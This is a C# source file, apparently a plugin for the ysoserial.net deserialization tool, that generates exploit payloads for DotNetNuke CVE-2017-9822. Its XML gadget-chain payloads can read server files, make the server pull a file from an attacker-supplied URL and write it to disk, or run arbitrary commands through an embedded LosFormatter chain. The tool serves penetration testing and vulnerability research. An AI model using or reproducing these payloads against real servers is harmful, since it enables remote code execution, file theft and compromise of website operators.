using System.Collections.Generic;
using NDesk.Options;
using System;
using ysoserial.Generators;
using ysoserial.Helpers;
using System.Text;

namespace ysoserial.Plugins
{
    public class DotNetNukePlugin : IPlugin
    {
        static string mode = "";
        static string path = "";
        static string url = "";
        static string command = "";
        static bool minify = false;
        static bool useSimpleType = false;

        static OptionSet options = new OptionSet()
            {
                {"m|mode=", "the payload mode: read_file, write_file, run_command.", v => mode = v },
                {"c|command=", "the command to be executed in run_command mode.", v => command = v },
                {"u|url=", "the url to fetch the file from in write_file mode.", v => url = v },
                {"f|file=", "the file to read in read_file mode or the file to write to in write_file_mode.", v => path = v },
                {"minify", "Whether to minify the payloads where applicable (experimental). Default: false", v => minify =  v != null },
            };

        public string Name()
        {
            return "DotNetNuke";
        }

        public string Description()
        {
            return "Generates payload for DotNetNuke CVE-2017-9822";
        }

        public string Credit()
        {
            return "discovered by Oleksandr Mirosh and Alvaro Munoz, implemented by Alvaro Munoz, tested by @GlitchWitch";
        }

        public OptionSet Options()
        {
            return options;
        }

        public object Run(string[] args)
        {
            InputArgs inputArgs = new InputArgs();
            List<string> extra;
            try
            {
                extra = options.Parse(args);
                inputArgs.Cmd = command;
                inputArgs.Minify = minify;
                inputArgs.UseSimpleType = useSimpleType;
            }
            catch (OptionException e)
            {
                Console.Write("ysoserial: ");
                Console.WriteLine(e.Message);
                Console.WriteLine("Try 'ysoserial -p " + Name() + " --help' for more information.");
                System.Environment.Exit(-1);
            }
            string payload = "";

            if (mode == "write_file" && path != "" & url != "")
            {
                payload = @"<profile><item key=""name1: key1"" type=""System.Data.Services.Internal.ExpandedWrapper`2[[DotNetNuke.Common.Utilities.FileSystemUtils],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089""><ExpandedWrapperOfFileSystemUtilsObjectDataProvider xmlns:xsd=""http://www.w3.org/2001/XMLSchema"" xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance""><ExpandedElement/><ProjectedProperty0><MethodName>PullFile</MethodName><MethodParameters><anyType xsi:type=""xsd:string"">" + url + @"</anyType><anyType xsi:type=""xsd:string"">" + path + @"</anyType></MethodParameters><ObjectInstance xsi:type=""FileSystemUtils""></ObjectInstance></ProjectedProperty0></ExpandedWrapperOfFileSystemUtilsObjectDataProvider></item></profile>";
            }
            else if (mode == "read_file" && path != "")
            {
                payload = @"<profile><item key=""name1: key1"" type=""System.Data.Services.Internal.ExpandedWrapper`2[[DotNetNuke.Common.Utilities.FileSystemUtils],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089""><ExpandedWrapperOfFileSystemUtilsObjectDataProvider xmlns:xsd=""http://www.w3.org/2001/XMLSchema"" xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance""><ExpandedElement/><ProjectedProperty0><MethodName>WriteFile</MethodName><MethodParameters><anyType xsi:type=""xsd:string"">" + path + @"</anyType></MethodParameters><ObjectInstance xsi:type=""FileSystemUtils""></ObjectInstance></ProjectedProperty0></ExpandedWrapperOfFileSystemUtilsObjectDataProvider></item></profile>";
            }
            else if (mode == "run_command" && command != "")
            {
                /*
                byte[] osf = (byte[]) new TextFormattingRunPropertiesGenerator().GenerateWithNoTest("ObjectStateFormatter", inputArgs);
                string b64encoded = Convert.ToBase64String(osf);
                */
                string b64encoded = Encoding.UTF8.GetString((byte[]) new TextFormattingRunPropertiesGenerator().GenerateWithNoTest("LosFormatter", inputArgs)); // for us here LosFormatter works the same as ObjectStateFormatter - we don't use MAC in LosFormatter so it is the same as ObjectStateFormatter
                string prefix = @"<profile><item key=""key"" type=""System.Data.Services.Internal.ExpandedWrapper`2[[System.Web.UI.ObjectStateFormatter, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089""><ExpandedWrapperOfObjectStateFormatterObjectDataProvider><ProjectedProperty0><ObjectInstance p3:type=""ObjectStateFormatter"" xmlns:p3=""http://www.w3.org/2001/XMLSchema-instance"" /><MethodName>Deserialize</MethodName><MethodParameters><anyType xmlns:q1=""http://www.w3.org/2001/XMLSchema"" p5:type=""q1:string"" xmlns:p5=""http://www.w3.org/2001/XMLSchema-instance"">";
                string suffix = @"</anyType></MethodParameters></ProjectedProperty0></ExpandedWrapperOfObjectStateFormatterObjectDataProvider></item></profile>";
                payload = prefix + b64encoded + suffix;
            }
            else
            {
                Console.Write("ysoserial: ");
                Console.WriteLine("Incorrect plugin mode/arguments combination");
                Console.WriteLine("Try 'ysoserial -p " + Name() + " --help' for more information.");
                System.Environment.Exit(-1);
            }

            if (minify)
            {
                payload = XmlHelper.Minify(payload, null, null);
            }

            return payload;

        }
    }
}
